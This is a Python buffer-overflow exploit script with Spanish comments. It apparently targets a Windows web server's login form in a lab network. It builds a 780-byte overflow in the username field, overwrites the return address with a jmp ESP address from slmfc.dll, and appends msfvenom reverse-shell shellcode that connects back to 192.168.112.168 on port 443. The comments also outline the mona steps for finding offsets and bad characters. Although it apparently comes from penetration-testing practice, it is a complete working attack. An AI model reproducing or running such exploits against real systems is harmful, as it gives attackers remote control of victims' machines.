#!/usr/bin/python

import socket, sys
from struct import pack

def explotacion():
    
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.112.168 LPORT=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
    
    shellcode=("\xdb\xce\xbf\xa8\x2a\x9e\x46\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
                "\x52\x31\x7d\x17\x83\xc5\x04\x03\xd5\x39\x7c\xb3\xd9\xd6\x02"
                "\x3c\x21\x27\x63\xb4\xc4\x16\xa3\xa2\x8d\x09\x13\xa0\xc3\xa5"
                "\xd8\xe4\xf7\x3e\xac\x20\xf8\xf7\x1b\x17\x37\x07\x37\x6b\x56"
                "\x8b\x4a\xb8\xb8\xb2\x84\xcd\xb9\xf3\xf9\x3c\xeb\xac\x76\x92"
                "\x1b\xd8\xc3\x2f\x90\x92\xc2\x37\x45\x62\xe4\x16\xd8\xf8\xbf"
                "\xb8\xdb\x2d\xb4\xf0\xc3\x32\xf1\x4b\x78\x80\x8d\x4d\xa8\xd8"
                "\x6e\xe1\x95\xd4\x9c\xfb\xd2\xd3\x7e\x8e\x2a\x20\x02\x89\xe9"
                "\x5a\xd8\x1c\xe9\xfd\xab\x87\xd5\xfc\x78\x51\x9e\xf3\x35\x15"
                "\xf8\x17\xcb\xfa\x73\x23\x40\xfd\x53\xa5\x12\xda\x77\xed\xc1"
                "\x43\x2e\x4b\xa7\x7c\x30\x34\x18\xd9\x3b\xd9\x4d\x50\x66\xb6"
                "\xa2\x59\x98\x46\xad\xea\xeb\x74\x72\x41\x63\x35\xfb\x4f\x74"
                "\x3a\xd6\x28\xea\xc5\xd9\x48\x23\x02\x8d\x18\x5b\xa3\xae\xf2"
                "\x9b\x4c\x7b\x54\xcb\xe2\xd4\x15\xbb\x42\x85\xfd\xd1\x4c\xfa"
                "\x1e\xda\x86\x93\xb5\x21\x41\x5c\xe1\x59\x39\x34\xf0\x99\x38"
                "\x7e\x7d\x7f\x50\x90\x28\x28\xcd\x09\x71\xa2\x6c\xd5\xaf\xcf"
                "\xaf\x5d\x5c\x30\x61\x96\x29\x22\x16\x56\x64\x18\xb1\x69\x52"
                "\x34\x5d\xfb\x39\xc4\x28\xe0\x95\x93\x7d\xd6\xef\x71\x90\x41"
                "\x46\x67\x69\x17\xa1\x23\xb6\xe4\x2c\xaa\x3b\x50\x0b\xbc\x85"
                "\x59\x17\xe8\x59\x0c\xc1\x46\x1c\xe6\xa3\x30\xf6\x55\x6a\xd4"
                "\x8f\x95\xad\xa2\x8f\xf3\x5b\x4a\x21\xaa\x1d\x75\x8e\x3a\xaa"
                "\x0e\xf2\xda\x55\xc5\xb6\xeb\x1f\x47\x9e\x63\xc6\x12\xa2\xe9"
                "\xf9\xc9\xe1\x17\x7a\xfb\x99\xe3\x62\x8e\x9c\xa8\x24\x63\xed"
                "\xa1\xc0\x83\x42\xc1\xc0")
    
    offset=780
    buffer="A"*offset
    #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    #jmp ESP
    #copiar oppcode
    #buscar en una dll del programa
    #!mona modules
    #tiene que tener las protecciones todo false
    #!mona find -s "\xff\xe4" -m slmfc.dll
    #ver que la direccion no tenga un badchar y copiar cualquiera
    buffer+=pack("<L",0x10090c83)
    buffer+="\x90"*20
    buffer+=shellcode
    
    try:
            
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.112.138',80))
        content = "username=" + buffer + "&password=A"
        buff = "POST /login HTTP/1.1\r\n"
        buff += "Host: 192.168.112.138\r\n"
        buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buff += "Accept-Language: en-US,en;q=0.5\r\n"
        buff += "Referer: http://192.168.112.138/login\r\n"
        buff += "Connection: close\r\n"
        buff += "Content-Type: application/x-www-form-urlencoded\r\n"
        buff += "Content-Length: "+str(len(content))+"\r\n"
        buff += "\r\n"
        buff += content
        s.send(buff)
        data = s.recv(1024)
    except:
        print("\n[!] Ha habido un error de conexion\n")
        sys.exit(1)
    

        


if __name__ == "__main__":
    explotacion()